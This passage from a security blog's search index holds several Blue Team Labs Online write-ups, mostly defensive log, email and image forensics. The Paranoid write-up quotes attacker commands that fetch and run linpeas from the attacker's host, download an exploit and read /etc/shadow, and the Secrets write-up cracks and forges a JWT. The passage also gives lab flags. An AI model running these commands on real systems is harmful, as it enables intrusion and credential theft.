\u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\u0026#34; 17:172.21.0.1 - - [12/Jan/2021:16:09:43 +0000] \u0026#34;GET /wp-includes/css/dashicons.min.css?ver=5.6 HTTP/1.1\u0026#34; 200 36064 \u0026#34;http://172.21.0.3/wp-login.php?itsec-hb-token=adminlogin\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\u0026#34; ... :::spoiler Flag Flag: /wp-login.php?itsec-hb-token=adminlogin :::\n==Q2== # Can you find two tools the attacker used?\nRecon # 這一題我是參考1，因為access.log內部資料的格式都一樣，所以可以用cut這個指令切出每一塊相同的部分，再用-f {number}的參數挑出要哪一塊\nExploit # $ cat access.log | cut -d \u0026#39;\u0026#34;\u0026#39; -f 6 | sort | uniq \u0026gt; aaa.txt 仔細觀察aaa.txt，會發現幾個熟悉的工具，包含sqlmap和wpscan，如果最後還是很多的話，還是可以搭配$ grep -v {filter key word} -E {multi key word}的方式減少結果\n$ cat access.log | cut -d \u0026#39;\u0026#34;\u0026#39; -f 6| sort | uniq | grep -v -E \u0026#34;AH01276|Mozilla\u0026#34; --color=auto - Apache/2.4.38 (Debian) PHP/7.4.13 (internal dummy connection) Apache/2.4.38 (Debian) PHP/7.4.14 (internal dummy connection) Opera/9.00 (Windows NT 5.1; U; de) WPScan v3.8.10 (https://wpscan.org/) WordPress/5.6; http://172.21.0.3 [Thu Jan 14 06:04:08.466086 2021] [php7:error] [pid 84] [client 168.22.54.119:0] PHP Fatal error: Uncaught Error: Call to undefined function Kadence\\\\get_header() in /var/www/html/wp-content/themes/kadence/index.php:10\\nStack trace:\\n#0 {main}\\n thrown in /var/www/html/wp-content/themes/kadence/index.php on line 10, referer: http://172.21.0.3/ [Thu Jan 14 06:05:30.750084 2021] [php7:error] [pid 99] [client 168.22.54.119:0] PHP Fatal error: Uncaught Error: Call to undefined function Kadence\\\\get_header() in /var/www/html/wp-content/themes/kadence/index.php:10\\nStack trace:\\n#0 {main}\\n thrown in /var/www/html/wp-content/themes/kadence/index.php on line 10, referer: http://172.21.0.3/ [Thu Jan 14 07:42:17.055410 2021] [php7:error] [pid 22] [client 172.21.0.1:44924] script \u0026#39;/var/www/html/wp-login.php\u0026#39; not found or unable to stat [Thu Jan 14 07:42:19.321162 2021] [php7:error] [pid 22] [client 172.21.0.1:44924] script \u0026#39;/var/www/html/wp-login.php\u0026#39; not found or unable to stat [Thu Jan 14 07:42:22.533632 2021] [php7:error] [pid 22] [client 172.21.0.1:44924] script \u0026#39;/var/www/html/wp-login.php\u0026#39; not found or unable to stat [Thu Jan 14 07:42:34.921671 2021] [php7:error] [pid 26] [client 172.21.0.1:44944] script \u0026#39;/var/www/html/wp-login.php\u0026#39; not found or unable to stat [Thu Jan 14 07:42:37.012631 2021] [php7:error] [pid 26] [client 172.21.0.1:44944] script \u0026#39;/var/www/html/wp-login.php\u0026#39; not found or unable to stat [Thu Jan 14 07:42:42.193155 2021] [php7:error] [pid 27] [client 172.21.0.4:59472] script \u0026#39;/var/www/html/wp-cron.php\u0026#39; not found or unable to stat, referer: http://172.21.0.3/wp-cron.php?doing_wp_cron=1610610161.9074409008026123046875 http://www.w3.org/1999/xhtml python-requests/2.24.0 sh: 1: /usr/sbin/sendmail: not found sqlmap/1.4.11#stable (http://sqlmap.org) :::spoiler Flag Flag: wpscan sqlmap :::\n==Q3== # The attacker tried to exploit a vulnerability in ‘Contact Form 7’. What CVE was the plugin vulnerable to? (Do some research!)\nRecon # 直接上網找Contact Form 7 CVE就會出現CVE-2020-35489\nThe contact-form-7 (aka Contact Form 7) plugin before 5.3.2 for WordPress allows Unrestricted File Upload and remote code execution because a filename may contain special characters.\n:::spoiler Flag Flag: CVE-2020-35489 :::\n==Q4== # What plugin was exploited to get access?\nRecon # 這一題可以搭配grep做出比較精確的filtering，我們想要找出plugins的部分，所以先grep出/plugins/的關鍵字，再用上面新學到的方式進階filter，到最後就只有一小部分的數量而已，\ncat access.log | grep \u0026#39;/plugins/\u0026#39; | cut -d \u0026#39;/\u0026#39; -f 6 | sort | uniq %20contact-form-7%20 %2e . WP_Estimation_Form accessally ait-csv-import-export akismet basic-contact-form better-wp-security contact-form-7 contact-form-7%20 contact-form-7..; contact-form-7? contact-form-7?? crelly-slider indeed-membership-pro loginizer plugins product-lister-walmart simple-file-list social-photo-gallery tinymce trx_addons woocommerce-checkout-manager wordpress-seo wp-advanced-search wp-live-chat-support-pro :::info Format: Plugin Name Here X.X.X 後面的X代表版本號 ::: 依序上網搜尋對應的plugin，剛好看到Simple File List有一個版本4.2.2是有任意上傳檔案的洞Exploit DB - Simple File List\n:::spoiler Flag Flag: Simple File List 4.2.2 :::\n==Q5== # What is the name of the PHP web shell file?\nRecon # 透過上一題我們知道該網站有一個任意上傳的洞，所以我們該找的是uploads這個key words，必且搭配前面學的filtering就可以找出奇異的檔案\n$ cat access.log | grep \u0026#39;/uploads/\u0026#39; | cut -d \u0026#39;/\u0026#39; -f 8 | sort | uniq 1.1\u0026#34; 200 1213 \u0026#34;http: 1.1\u0026#34; 200 1295 \u0026#34;-\u0026#34; \u0026#34;Mozilla 1.1\u0026#34; 200 215 \u0026#34;http: 1.1\u0026#34; 200 4672 \u0026#34;http: 1.1\u0026#34; 200 4789 \u0026#34;http: 1.1\u0026#34; 200 5356 \u0026#34;http: 1.1\u0026#34; 200 5357 \u0026#34;http: 1.1\u0026#34; 200 5436 \u0026#34;http: 1.1\u0026#34; 200 5588 \u0026#34;http: 1.1\u0026#34; 200 5754 \u0026#34;http: 1.1\u0026#34; 200 6513 \u0026#34;http: 1.1\u0026#34; 200 84690 \u0026#34;-\u0026#34; \u0026#34;python-requests 1.1\u0026#34; 403 455 \u0026#34;http: 1.1\u0026#34; 404 29045 \u0026#34;http: 1.1\u0026#34; 404 335 \u0026#34;http: 1.1\u0026#34; 404 488 \u0026#34;-\u0026#34; \u0026#34;Mozilla fr34k.png HTTP test.png HTTP :::spoiler Flag Flag: fr34k.php :::\n==Q6== # What was the HTTP response code provided when the web shell was accessed for the final time?\nRecon # 從前面我們知道了web shell的檔名，那我們就可以針對該檔案進行grep\n$ cat access.log | grep \u0026#39;fr34k\u0026#39; | cut -d \u0026#39;\u0026#34;\u0026#39; -f 3 404 29045 200 84690 200 1295 200 1213 200 1213 200 5436 200 5356 200 5588 200 4672 200 5357 200 5754 200 5356 200 6513 200 5357 200 5357 200 4789 200 5357 200 215 404 488 可以看到最後一筆是404的狀態\nExploit # :::spoiler Flag Flag: 404 :::\nReference # Log Analysis -Compromised WordPress — BTLO, WriteUp\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":36,"href":"/security/practice/btlo/digital-forensic/btlo---meta/","title":"BTLO - Meta","section":"Securities","content":" BTLO - Meta # Challenge: https://blueteamlabs.online/home/challenge/meta-b976cec9e2\n:::spoiler TOC [TOC] :::\nScenario # The attached images were posted by a criminal on the run, with the caption \u0026ldquo;I\u0026rsquo;m roaming free. You will never catch me\u0026rdquo;. We believe you can assist us in proving him wrong.\n==Q1== # What is the camera model?\nRecon # 問有關圖片相關的forensics直覺就是利用exiftool幫忙parse其中的內容，之後再慢慢extract出有用的資訊，或是直接丟到chatgpt幫忙extract問題的答案\nExploit # $ sudo apt install exiftool -y $ exiftool uploaded_1.JPG \u0026gt; uploaded1_exiftool.txt $ exiftool uploaded_2.png \u0026gt; uploaded2_exiftool.txt chatgpt紀錄\n:::spoiler Flag Flag: Canon EOS 550D :::\n==Q2== # When was the picture taken?\nExploit # 這個也是直接看exiftool parse出的Create Date info就好\n:::spoiler Flag Flag: 2021:11:02 13:20:23 :::\n==Q3== # What does the comment on the first image says?\nExploit # 直接看Comment的欄位就有了\n:::spoiler Flag Flag: relying on altered metadata to catch me? :::\n==Q4== # Where could the criminal be?\nExploit # 這個直接以圖搜圖，就看到類似的建築物在加德滿都\n:::spoiler Flag Flag: Kathmandu :::\n"},{"id":37,"href":"/security/practice/btlo/incident-response/btlo---paranoid/","title":"BTLO - Paranoid","section":"Securities","content":" BTLO - Paranoid # Challenge: https://blueteamlabs.online/home/challenge/paranoid-e5e164befb\n:::spoiler TOC [TOC] ::: :::info 此lab大部分是參考1的說明，因為本身第一次接觸aureport，所以不太清楚指令或者是注意的地方 :::\nTool # AUReport: $ sudo apt install auditd Linux CLI\nBackground # aureport --help usage: aureport [options] -a,--avc Avc report -au,--auth Authentication report --comm Commands run report -c,--config Config change report -cr,--crypto Crypto report --debug Write malformed events that are skipped to stderr --eoe-timeout secs End of Event Timeout -e,--event Event report --escape option Escape output -f,--file File name report --failed only failed events in report -h,--host Remote Host name report --help help -i,--interpret Interpretive mode -if,--input \u0026lt;Input File name\u0026gt; use this file as input --input-logs Use the logs even if stdin is a pipe --integrity Integrity event report -k,--key Key report -l,--login Login report -m,--mods Modification to accounts report -ma,--mac Mandatory Access Control (MAC) report -n,--anomaly aNomaly report -nc,--no-config Don\u0026#39;\u0026#39;t include config events --node \u0026lt;node name\u0026gt; Only events from a specific node -p,--pid Pid report -r,--response Response to anomaly report -s,--syscall Syscall report --success only success events in report --summary sorted totals for main object in report -t,--log Log time range report -te,--end [end date] [end time] ending date \u0026amp; time for reports -tm,--terminal TerMinal name report -ts,--start [start date] [start time] starting data \u0026amp; time for reports --tty Report about tty keystrokes -u,--user User name report -v,--version Version --virt Virtualization report -x,--executable eXecutable name report If no report is given, the summary report will be displayed 起手式 # $ sudo aureport --summary -if audit.log Summary Report ====================== Range of time in logs: 10/05/21 08:22:07.664 - 10/05/21 08:28:06.610 Selected time for report: 10/05/21 08:22:07 - 10/05/21 08:28:06.610 Number of changes in configuration: 15 Number of changes to accounts, groups, or roles: 0 Number of logins: 1 Number of failed logins: 87 Number of authentications: 3 Number of failed authentications: 89 Number of users: 3 Number of terminals: 10 Number of host names: 6 Number of executables: 115 Number of commands: 192 Number of files: 298 Number of AVC\u0026#39;s: 0 Number of MAC events: 0 Number of failed syscalls: 1606 Number of anomaly events: 0 Number of responses to anomaly events: 0 Number of crypto events: 0 Number of integrity events: 0 Number of virt events: 0 Number of keys: 1 Number of process IDs: 10679 Number of events: 16732 ==Q1== # What account was compromised?\nRecon # 既然是和帳號有關那就是和authentication有關，所以可以先用summary看他有多少user(結果如上)，再用-au指令看成功(失敗)的認證有多少\n$ sudo aureport -if audit.log -au Authentication Report ============================================ # date time acct host term exe success event ============================================ 1. 10/05/21 08:22:39 btlo 192.168.4.155 ssh /usr/sbin/sshd no 465368 2. 10/05/21 08:22:39 btlo 192.168.4.155 ssh /usr/sbin/sshd no 465374 3. 10/05/21 08:22:39 btlo 192.168.4.155 ssh /usr/sbin/sshd no 465381 4. 10/05/21 08:22:39 btlo 192.168.4.155 ssh /usr/sbin/sshd no 465382 5. 10/05/21 08:22:39 btlo 192.168.4.155 ssh /usr/sbin/sshd no 465384 ... 85. 10/05/21 08:22:55 btlo 192.168.4.155 ssh /usr/sbin/sshd yes 465936 ... 89. 10/05/21 08:23:13 btlo 192.168.4.155 ssh /usr/sbin/sshd yes 467550 ... 90. 10/05/21 08:23:34 btlo ? /dev/pts/1 /usr/bin/sudo yes 468442 91. 10/05/21 08:25:40 btlo ? /dev/pts/1 /usr/bin/sudo no 473858 92. 10/05/21 08:25:41 btlo ? /dev/pts/1 /usr/bin/sudo no 473860 可以發現account name都是==btlo==，不過奇怪的是前面有一大堆的認證失敗，到最後才有三次的認證成功，所以我們可以很清楚的知道攻擊者就是==192.168.4.155==嘗試用==bruteforce==的方式透過ssh登入進來\n:::spoiler Flag Flag: btlo :::\n==Q2== # What attack type was used to gain initial access?\nRecon # 呈上題\n:::spoiler Flag Flag: bruteforce :::\n==Q3== # What is the attacker\u0026rsquo;s IP address?\nRecon # 呈上題\n:::spoiler Flag Flag: 192.168.4.155 :::\n==Q4== # What tool was used to perform system enumeration?\nRecon # 根據1的說明，此時要使用到--tty的參數列出登入進來之後下甚麼command\nsudo aureport -if audit.log --tty TTY Report =============================================== # date time event auid term sess comm data =============================================== 1. 10/05/21 08:23:16 468403 1001 pts1 49 sh \u0026#34;hostname\u0026#34;,\u0026lt;nl\u0026gt; 2. 10/05/21 08:23:21 468408 1001 pts1 49 sh \u0026#34;whoami\u0026#34;,\u0026lt;nl\u0026gt; 3. 10/05/21 08:23:26 468414 1001 pts1 49 sh \u0026#34;ls\u0026#34;,\u0026lt;nl\u0026gt; 4. 10/05/21 08:23:27 468419 1001 pts1 49 sh \u0026#34;sudo -l\u0026#34;,\u0026lt;nl\u0026gt; 5. 10/05/21 08:23:34 468447 1001 pts1 49 sh \u0026lt;nl\u0026gt; 6. 10/05/21 08:23:37 468450 1001 pts1 49 sh \u0026#34;wget -O - http://192.168.4.155:8000/linpeas.sh | sh\u0026#34;,\u0026lt;nl\u0026gt; 7. 10/05/21 08:26:21 480914 1001 pts1 49 sh \u0026#34;lsb_release -a\u0026#34;,\u0026lt;nl\u0026gt; 8. 10/05/21 08:26:31 480921 1001 pts1 49 sh \u0026#34;sudo -V\u0026#34;,\u0026lt;nl\u0026gt; 9. 10/05/21 08:26:36 480934 1001 pts1 49 sh \u0026#34;wget http://192.168.4.155:8000/evil.tar.gz\u0026#34;,\u0026lt;nl\u0026gt; 10. 10/05/21 08:26:45 480944 1001 pts1 49 sh \u0026#34;ls\u0026#34;,\u0026lt;nl\u0026gt; 11. 10/05/21 08:26:50 480947 1001 pts1 49 sh \u0026#34;tar zxvf evil.tar.gz\u0026#34;,\u0026lt;nl\u0026gt; 12. 10/05/21 08:26:59 480982 1001 pts1 49 sh \u0026#34;cd evil\u0026#34;,\u0026lt;nl\u0026gt; 13. 10/05/21 08:27:03 480984 1001 pts1 49 sh \u0026#34;ls\u0026#34;,\u0026lt;nl\u0026gt; 14. 10/05/21 08:27:06 480987 1001 pts1 49 sh \u0026#34;make\u0026#34;,\u0026lt;nl\u0026gt; 15. 10/05/21 08:27:10 481020 1001 pts1 49 sh \u0026#34;./evil 0\u0026#34;,\u0026lt;nl\u0026gt; 16. 10/05/21 08:27:17 481039 1001 pts1 49 sh \u0026#34;whoami\u0026#34;,\u0026lt;nl\u0026gt; 17. 10/05/21 08:27:21 481050 1001 pts1 49 sh \u0026#34;rm -rf /home/btlo/evil\u0026#34;,\u0026lt;nl\u0026gt; 18. 10/05/21 08:27:39 481059 1001 pts1 49 sh \u0026#34;rm /home/btlo/evil.tar.gz\u0026#34;,\u0026lt;nl\u0026gt; 19. 10/05/21 08:27:45 481062 1001 pts1 49 sh \u0026#34;cat /etc/shadow\u0026#34;,\u0026lt;nl\u0026gt; 20. 10/05/21 08:27:50 481064 1001 pts1 49 sh \u0026#34;exit\u0026#34;,\u0026lt;nl\u0026gt; 21. 10/05/21 08:27:53 481065 1001 pts1 49 sh \u0026#34;exit\u0026#34;,\u0026lt;nl\u0026gt; 從以上結果得知，攻擊者進來以後先recon一下(hostname / whoami / ls / sudo -l(查看目前的身分可以下甚麼command))，最重要的是他wget了一個linpeas.sh，這是一個專用於linux based的提權工具，詳細的資訊可以看Linux權限提升研究: 自動化信息收集，甚至後面下載了一個evil，應該是自己寫的或是自己蒐集的武器庫，提權完了之後就是要查看最重要的地方，也就是==/etc/shadow==，就是真實存密碼的地方\n:::spoiler Flag Flag: linpeas :::\n==Q5== # What is the name of the binary and pid used to gain root?\nRecon # 既然我們已經知道他下載了一個evil tar並且執行其中的script，那麼在process紀錄中一定有相關資訊，此時可以下-p列出所有process list，然後我們要著重在evil這個key word，所以記得grep\nExploit # $ sudo aureport -if audit.log -p | grep \u0026#34;evil\u0026#34; # date time acct host term exe success event 16156. 10/05/21 08:27:17 829992 /home/btlo/evil/evil 59 1001 481021 :::spoiler Flag Flag: evil, 829992 :::\n==Q6== # What CVE was exploited to gain root access? (Do your research!)\nRecon # 只要上網找這一題的題目就會出現相關的CVE :::spoiler Flag Flag: CVE-2021-3156 :::\n==Q7== # What type of vulnerability is this?\nRecon # 呈上題，也可以看chatgpt的回答\n:::spoiler Flag Flag: heap_based buffer overflow :::\n==Q8== # What file was exfiltrated once root was gained?\nRecon # 呈第4題\n:::spoiler Flag Flag: /etc/shadow :::\nReference # BTLO - Paranoid\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":38,"href":"/security/practice/btlo/security-operation/btlo---phishing-analysis/","title":"BTLO - Phishing Analysis","section":"Securities","content":" BTLO - Phishing Analysis # Challenge: https://blueteamlabs.online/home/challenge/phishing-analysis-f92ef500ce\n:::spoiler TOC [TOC] :::\nScenario # A user has received a phishing email and forwarded it to the SOC. Can you investigate the email and attachment to collect useful artifacts?\nTools # Text Editor Mozilla Thunderbird URL2PNG WHOis\n==Q1== # Who is the primary recipient of this email?\nRecon # 這一題可以直接用線上工具 - EML Viewer把eml file轉成pdf，不過風險就是有很多的資訊會流失掉，所以比較好的方式就是直接裝Mozilla Thunderbird查看 :::spoiler Flag Flag: kinnar1975@yahoo.co.uk :::\n==Q2== # What is the subject of this email?\nRecon # 呈上題 :::spoiler Flag Flag: Undeliverable: Website contact form submission :::\n==Q3== # What is the date and time the email was sent?\nRecon # 呈上題 :::spoiler Flag Flag: 18 March 2021 04:14 :::\n==Q4== # What is the Originating IP?\nRecon # 這個就是要用Text Editor string search Originating就會發現這個IP :::spoiler Flag Flag: 103.9.171.10 :::\n==Q5== # Perform reverse DNS on this IP address, what is the resolved host? (whois.domaintools.com)\nRecon # 直接用線上工具看這個IP的相關資訊 :::spoiler Flag Flag: c5s2-1e-syd.hosting-services.net.au :::\n==Q6== # What is the name of the attached file?\nRecon # 呈第一題可以發現有一個attachment :::spoiler Flag Flag: Website contact form submission.eml :::\n==Q7== # What is the URL found inside the attachment?\nRecon # 呈上題，點進這個附件可以看到一段URL :::spoiler Flag Flag: https://35000usdperwwekpodf.blogspot.sg?p=9swghttps://35000usdperwwekpodf.blogspot.co.il?o=0hnd :::\n==Q8== # What service is this webpage hosted on?\nRecon # 呈上題，這個我是參考1的說明，可以觀察釣魚的網址\n:::spoiler Flag Flag: blogspot :::\n==Q9== # Using URL2PNG, what is the heading text on this page? (Doesn\u0026rsquo;t matter if the page has been taken down!)\nRecon # 這個就直接看線上工具 - URL2PNG :::spoiler Flag Flag: Blog has been removed :::\nReference # Phishing Analysis- Blue Team Lab Walkthrough\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":39,"href":"/security/practice/btlo/incident-response/btlo---secrets/","title":"BTLO - Secrets","section":"Securities","content":" BTLO - Secrets # Challenge: https://blueteamlabs.online/home/challenge/secrets-85aa2bb3a9\n:::spoiler TOC [TOC] :::\nScenario # You’re a senior cyber security engineer and during your shift, we have intercepted/noticed a high privilege actions from unknown source that could be identified as malicious. We have got you the ticket that made these actions. You are the one who created the secret for these tickets. Please fix this and submit the low privilege ticket so we can make sure that you deserve this position. Here is the ticket:\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmbGFnIjoiQlRMe180X0V5ZXN9IiwiaWF0Ijo5MDAwMDAwMCwibmFtZSI6IkdyZWF0RXhwIiwiYWRtaW4iOnRydWV9.jbkZHll_W17BOALT95JQ17glHBj9nY-oWhT1uiahtv8\n==Q1== # Can you identify the name of the token? (Format: String)\nRecon # 看到三段用.拼起來就直覺是jwt\n:::spoiler Flag Flag: jwt :::\n==Q2== # What is the structure of this token? (Format: Section.Section.Section)\nRecon # Common Sense就是header + payload + signature :::spoiler Flag Flag: header.payload.signature :::\n==Q3== # What is the hint you found from this token? (Format: String)\nRecon # 這一題真的不知道在衝三小，最後參考1才知道，但實在是太隱晦了，不管是問題還是答案出乎意料\n:::spoiler Flag Flag: _4_Eyes :::\n==Q4== # What is the Secret? (Format: String)\nRecon # 這個直覺就是要爆破簽署的secrets，因為看來看去都沒有其他地方有leak出來，所以可以用hashcat或是john爆破出來\nExploit # Hashcat - Hacking JWT Tokens: Bruteforcing Weak Signing Key (Hashcat) $ echo \u0026#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmbGFnIjoiQlRMe180X0V5ZXN9IiwiaWF0Ijo5MDAwMDAwMCwibmFtZSI6IkdyZWF0RXhwIiwiYWRtaW4iOnRydWV9.jbkZHll_W17BOALT95JQ17glHBj9nY-oWhT1uiahtv8\u0026#39;\u0026gt; jwt.txt $ hashcat -a 3 -m 16500 jwt.txt ?a?a?a?a hashcat (v6.2.6) starting OpenCL API (OpenCL 3.0 PoCL 4.0+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ================================================================================================================================================== * Device #1: cpu-sandybridge-Intel(R) Core(TM) i7-10700F CPU @ 2.90GHz, 2910/5884 MB (1024 MB allocatable), 4MCU Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Optimizers applied: * Zero-Byte * Not-Iterated * Single-Hash * Single-Salt * Brute-Force Watchdog: Temperature abort trigger set to 90c Host memory required for this attack: 1 MB eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmbGFnIjoiQlRMe180X0V5ZXN9IiwiaWF0Ijo5MDAwMDAwMCwibmFtZSI6IkdyZWF0RXhwIiwiYWRtaW4iOnRydWV9.jbkZHll_W17BOALT95JQ17glHBj9nY-oWhT1uiahtv8:bT!0 Session..........: hashcat Status...........: Cracked Hash.Mode........: 16500 (JWT (JSON Web Token)) Hash.Target......: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmbGFnIjoiQl...iahtv8 Time.Started.....: Sun Dec 31 03:50:45 2023 (7 secs) Time.Estimated...: Sun Dec 31 03:50:52 2023 (0 secs) Kernel.Feature...: Pure Kernel Guess.Mask.......: ?a?a?a?a [4] Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 2621.9 kH/s (6.10ms) @ Accel:128 Loops:47 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 16902144/81450625 (20.75%) Rejected.........: 0/16902144 (0.00%) Restore.Point....: 177664/857375 (20.72%) Restore.Sub.#1...: Salt:0 Amplifier:0-47 Iteration:0-47 Candidate.Engine.: Device Generator Candidates.#1....: s5VH -\u0026gt; RT^a Hardware.Mon.#1..: Util: 95% Started: Sun Dec 31 03:50:44 2023 Stopped: Sun Dec 31 03:50:53 2023 John - Hacking JWT Tokens: Bruteforcing Weak Signing Key (JohnTheRipper) 這要取決於wordlist有沒有，所以我只是先以secret=1234，然後用john爆破 $ echo \u0026#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmbGFnIjoiQlRMe180X0V5ZXN9IiwiaWF0Ijo5MDAwMDAwMCwibmFtZSI6IkdyZWF0RXhwIiwiYWRtaW4iOnRydWV9.2kwB24fBrrmotFu9cdeRb1EMg1kRfGlLQPvhE1OUtp0\u0026#39;\u0026gt; jwt.txt $ john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 Using default input encoding: UTF-8 Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 AVX 4x]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 1234 (?) 1g 0:00:00:00 DONE (2023-12-31 03:46) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. :::spoiler Flag Flag: bT!0 :::\n==Q5== # Can you generate a new verified signature ticket with a low privilege? (Format: String.String.String)\nRecon # 我們知道了secrets===bT!0==，所以我們可以用這個secrets簽章新的payload :::spoiler Flag Flag: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmbGFnIjoiQlRMe180X0V5ZXN9IiwiaWF0Ijo5MDAwMDAwMCwibmFtZSI6IkdyZWF0RXhwIiwiYWRtaW4iOmZhbHNlfQ.nMXNFvttCvtDcpswOQA8u_LpURwv6ZrCJ-ftIXegtX4 :::\nReference # BTLO — Secrets Walkthrough\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":40,"href":"/security/practice/btlo/digital-forensic/btlo---shiba-insider/","title":"BTLO - Shiba Insider","section":"Securities","content":" BTLO - Shiba Insider # Challenge: https://blueteamlabs.online/home/challenge/shiba-insider-5b48123711\n:::spoiler TOC [TOC] :::\nTools # Wireshark CyberChef Steghide Command Line Exiftool\n==Q1== # What is the response message obtained from the PCAP file?\nRecon # 這一題首先看到一個pcap file，以及zip file，不過zip file需要密碼才能unzip，所以先看pcap file有沒有相關訊息\n這個流量紀錄非常簡單，就是一個簡單的tcp connection，包含前面的三向交握以及get packet，交換完訊息之後當然就是要finish conversation，所以重點在中間他們交換的訊息 傳回來的訊息說: use your own password，其實也就是該題的答案\n:::spoiler Flag Flag: use your own password :::\n==Q2== # What is the password of the ZIP file?\nRecon # 呈上題，我們看到他給的提示後，往上看他的Authorization其實是個base64 encode的可疑資訊，decode之後發現是個username:password的資訊→==fakeblue:redforever==\n:::spoiler Flag Flag: redforever :::\n==Q3== # Will more passwords be required?\nRecon # 呈上題，利用密碼解開zip file後會看到readme.txt和ssdog1.jpeg，根據readme的內容，我們之後不會需要用到其他的密碼\n:::spoiler Flag Flag: No :::\n==Q4== # What is the name of a widely-used tool that can be used to obtain file information?\nRecon # 呈上題，看到圖片直覺就是那幾個工具: steghide / exiftool / pngcheck / stat / file / formost / zsteg / binwalk\u0026hellip;，所以該題就是==exiftool==\n:::spoiler Flag Flag: exiftool :::\n==Q5== # What is the name and value of the interesting information obtained from the image file metadata?\nRecon # 查看完了exiftool的確看到蠻多資訊，包含steghide，所以根據字數的提示找到flag\n:::spoiler Flag Flag: Technique:Steganography :::\n==Q6== # Based on the answer from the previous question, what tool needs to be used to retrieve the information hidden in the file?\nRecon # 呈上題，看解析出的info就知道是用steghide藏訊息在裡面\n:::spoiler Flag Flag: steghide :::\n==Q7== # Enter the ID retrieved.\nRecon # 我們利用steghide解析出隱藏的訊息並且根據上兩題的提示沒有任何密碼，就可以得到一個idInsider.txt的檔案，內容就是該題Flag\n$ steghide extract -sf ssdog1.jpeg Enter passphrase: wrote extracted data to \u0026#34;idInsider.txt\u0026#34;. :::spoiler Flag Flag: 0726ba878ea47de571777a :::\n==Q8== # What is the profile name of the attacker?\nRecon # 這一題是最難的，應該說他的題目敘述讓我很難想到怎麼解，所以這個是按照其他人的1才知道\n首先前一題的內容是一個user的id，而我們在第二題解析出的username其實是個fake username，真正的user其實應該是我們前一題拿到的id對應到的user，也就是BTLO網站上會顯示的user ID，所以只要前往https://blueteamlabs.online/home/user/0726ba878ea47de571777a 的頁面，就會看到該user為何 是一個叫做bluetiger的用戶，也就是我們此題的答案\nExploit # :::spoiler Flag Flag: bluetiger :::\nReference # Shiba Insider - Steganography Challenge - Blue Team Labs Online \u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":41,"href":"/security/competition/cggc-2023-%E5%88%9D%E8%B3%BD/","title":"CGGC 2023 初賽","section":"Securities","content":" CGGC 2023 初賽 # 隊名: 王凡補習班 名次 這一次參賽雖然打出來的不多，但重點還是有學到很多東西，感謝@davidchen學長帶我飛，我覺得互相交流之後的這種隱形的貢獻也是很重要的 GaoYi # Source code # :::spoiler IDA main function\nint __cdecl main(int argc, const char **argv, const char **envp) { // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-\u0026#34;+\u0026#34; TO EXPAND] setvbuf(stdout, 0LL, 2LL, 0LL); puts(TITLE); puts(\u0026#34;Welcome to the Charitable Lag Vegas!\u0026#34;); puts(\u0026#34;Anyone can participate with three million US dollars.\u0026#34;); puts(\u0026#34;You play with 52 cards with (S)pades, (C)lub, (H)earts, (D)iamond.\u0026#34;); puts(\u0026#34;[+] Game 1: Predict the first 8 cards I draw in exact order.\u0026#34;); puts(\u0026#34;[+] Input example: \\\u0026#34;C8\\\u0026#34;.\u0026#34;); v47 = 0; for ( i = 0; i \u0026lt;= 7; ++i ) { printf((unsigned int)\u0026#34;Card %c: \u0026#34;, i + 49, v3, v4, v5, v6, flag[0]); fgets(\u0026amp;input[32 * i], 32LL, stdin); if ( !(unsigned int)isACard((__int64)\u0026amp;input[32 * i]) ) --v47; } for ( j = 0; j \u0026lt;= 7; ++j ) { if ( (unsigned __int64)j_strlen_ifunc(\u0026amp;input[32 * j]) \u0026gt; 1 ) { v7 = j == 7 \u0026amp;\u0026amp; input[224] == \u0026#39;H\u0026#39;; v8 = !j \u0026amp;\u0026amp; input[2] == \u0026#39;0\u0026#39;; v9 = v8 + v7; v10 = j == 1 \u0026amp;\u0026amp; input[32] == \u0026#39;S\u0026#39;; v11 = v10 + v9; v12 = !j \u0026amp;\u0026amp; input[0] == \u0026#39;H\u0026#39;; v13 = v12 + v11; v14 = j == 1 \u0026amp;\u0026amp; input[33] == \u0026#39;2\u0026#39;; v15 = v14 + v13; v16 = j == 4 \u0026amp;\u0026amp; input[129] == \u0026#39;7\u0026#39;; v17 = v16 + v15; v18 = j == 2 \u0026amp;\u0026amp; input[64] == \u0026#39;C\u0026#39;; v19 = v18 + v17; v20 = j == 3 \u0026amp;\u0026amp; input[96] == \u0026#39;S\u0026#39;; v21 = v20 + v19; v22 = j == 6 \u0026amp;\u0026amp; input[192] == \u0026#39;H\u0026#39;; v23 = v22 + v21; v24 = j == 2 \u0026amp;\u0026amp; input[65] == \u0026#39;8\u0026#39;; v25 = v24 + v23; v26 = 